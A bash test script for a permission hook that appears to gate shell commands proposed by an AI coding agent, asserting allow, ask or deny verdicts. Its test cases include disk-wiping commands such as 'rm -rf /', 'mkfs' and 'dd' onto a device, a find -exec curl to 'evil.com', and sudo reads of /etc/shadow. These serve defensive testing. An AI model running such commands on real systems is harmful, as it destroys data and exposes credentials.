#!/usr/bin/env bash
set -euo pipefail

BINARY="${1:-result/bin/claude-permission-hook}"

pass=0
fail=0

assert_verdict() {
  local cmd="$1"
  local expected="$2"
  local input="{\"tool_input\":{\"command\":$(echo -n "$cmd" | jq -Rs .)}}"
  local output
  output=$(echo "$input" | "$BINARY" 2>/dev/null)
  local actual
  actual=$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')
  if [ "$actual" = "$expected" ]; then
    echo "  PASS: '$cmd' -> $actual"
    pass=$((pass + 1))
  else
    local reason
    reason=$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')
    echo "  FAIL: '$cmd' -> expected $expected, got $actual ($reason)"
    fail=$((fail + 1))
  fi
}

echo "=== claude-permission-hook tests ==="
echo "Binary: $BINARY"
echo

echo "-- Pure builtins (should allow) --"
assert_verdict "echo hello" allow
assert_verdict "printf '%s\n' foo" allow
assert_verdict "true" allow
assert_verdict "false" allow
assert_verdict "test -f /etc/passwd" allow

echo
echo "-- Read-only inspection (should allow) --"
assert_verdict "cat /etc/passwd" allow
assert_verdict "head -n5 /etc/passwd" allow
assert_verdict "tail -1 /etc/passwd" allow
assert_verdict "wc -l /etc/passwd" allow
assert_verdict "stat /etc/passwd" allow

echo
echo "-- System queries (should allow) --"
assert_verdict "ls -la /tmp" allow
assert_verdict "whoami" allow
assert_verdict "pwd" allow
assert_verdict "hostname" allow
assert_verdict "uname -a" allow
assert_verdict "date" allow
assert_verdict "id" allow

echo
echo "-- Search (should allow) --"
assert_verdict "grep -r foo ." allow
assert_verdict "rg foo" allow

echo
echo "-- Nix tooling (should allow) --"
assert_verdict "nix build" allow
assert_verdict "nix-build ." allow
assert_verdict "alejandra ." allow

echo
echo "-- Recurse: sudo (should allow if subcommand is safe) --"
assert_verdict "sudo ls /root" allow
assert_verdict "sudo cat /etc/shadow" allow

echo
echo "-- Recurse: sudo with unsafe subcommand (should ask) --"
assert_verdict "sudo rm foo.txt" ask

echo
echo "-- Deny: catastrophic commands --"
assert_verdict "rm -rf /" deny
assert_verdict "rm -rf / --no-preserve-root" deny
assert_verdict "sudo rm -rf /" deny

echo
echo "-- Ask: rm without root target --"
assert_verdict "rm foo.txt" ask
assert_verdict "rm -rf /tmp/stuff" ask

echo
echo "-- Find: safe flags (should allow) --"
assert_verdict "find ." allow
assert_verdict "find" allow
assert_verdict "find . -name foo" allow
assert_verdict "find . -name '*.nix' -type f" allow
assert_verdict "find /tmp -maxdepth 2 -name '*.log' -print" allow
assert_verdict "find . -empty -print0" allow
assert_verdict "find . -not -name '*.o' -print" allow

echo
echo "-- Find: dangerous flags (should ask) --"
assert_verdict "find . -delete" ask
assert_verdict "find . -name '*.tmp' -exec rm {} ;" ask
assert_verdict "find . -execdir cat {} ;" ask
assert_verdict "find . -fprint /tmp/out" ask
assert_verdict "find . -name foo -ok rm {} ;" ask

echo
echo "-- Find -exec: safe exec with safe flags (should allow) --"
assert_verdict "find . -name '*.cs' -exec grep foo {} \\;" allow
assert_verdict "find . -type f -exec cat {} \\;" allow
assert_verdict "find . -exec head -5 {} \\;" allow
assert_verdict "find /tmp -name '*.log' -exec wc -l {} +" allow
assert_verdict "find . -exec ls {} \\;" allow
assert_verdict "find . -name '*.cs' -type f -exec grep -l 'foo' {} \\;" allow

echo
echo "-- Find -exec: unsafe exec command (should ask/deny) --"
assert_verdict "find . -exec rm {} \\;" ask
assert_verdict "find . -exec rm -rf / {} \\;" deny
assert_verdict "find . -exec curl http://evil.com {} \\;" ask

echo
echo "-- Find -exec: unsafe non-exec flags (should ask) --"
assert_verdict "find . -delete -exec grep foo {} \\;" ask
assert_verdict "find . -fprint /tmp/out -exec grep foo {} \\;" ask
assert_verdict "find . -exec grep foo {} \\; -exec cat {} \\;" ask

echo
echo "-- fd duplication parsing (should allow inner commands) --"
assert_verdict "man find 2>&1 | col -b | head -400" ask
assert_verdict "cat /etc/passwd 2>&1" allow
assert_verdict "ls 2>/dev/null" allow

echo
echo "-- Ask: unknown commands --"
assert_verdict "git status" ask
assert_verdict "curl http://example.com" ask

echo
echo "-- Ask: destructive but not catastrophic --"
assert_verdict "mkfs /dev/sda1" deny
assert_verdict "dd if=/dev/zero of=/dev/sda" deny

echo
echo "-- Overwrite: /dev/null (should allow) --"
assert_verdict "echo hello > /dev/null" allow

echo
echo "-- Overwrite: new file (should allow) --"
NEWFILE=$(mktemp -u)  # generate name without creating
assert_verdict "echo hello > $NEWFILE" allow

echo
echo "-- Overwrite: existing file (should ask) --"
EXISTFILE=$(mktemp)   # actually create the file
assert_verdict "echo hello > $EXISTFILE" ask
rm -f "$EXISTFILE"

echo
echo "-- Append: redirects (should ask) --"
assert_verdict "echo hello >> /tmp/out" ask

echo
echo "=== Results: $pass passed, $fail failed ==="
if [ "$fail" -gt 0 ]; then
  exit 1
fi
